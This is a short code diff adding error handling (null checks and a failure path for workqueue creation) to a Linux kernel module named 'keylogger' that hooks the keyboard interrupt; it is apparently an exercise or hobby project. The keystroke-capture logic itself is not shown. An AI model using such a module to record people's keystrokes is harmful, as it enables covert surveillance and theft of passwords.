@@ -401,8 +401,10 @@ static void		__exit keylogger_clean(void)
 	key_log_print_unified();
 	free_irq(KEYBOARD_IRQ, &key_handler);
 	misc_deregister(&dev);
-	flush_workqueue(workqueue);
-	destroy_workqueue(workqueue);
+	if (workqueue) {
+		flush_workqueue(workqueue);
+		destroy_workqueue(workqueue);
+	}
 	key_log_clean();
 	mutex_unlock(&lock);
 }
@@ -429,6 +431,11 @@ static int		__init hello_init(void)
 		return 1;
 	}
 	workqueue = create_workqueue("keylogger");
+	if (!workqueue) {
+		keylogger_clean();
+		pr_err("failed to create workqueue.");
+		return -ENOMEM;
+	}
 	return 0;
 }
 
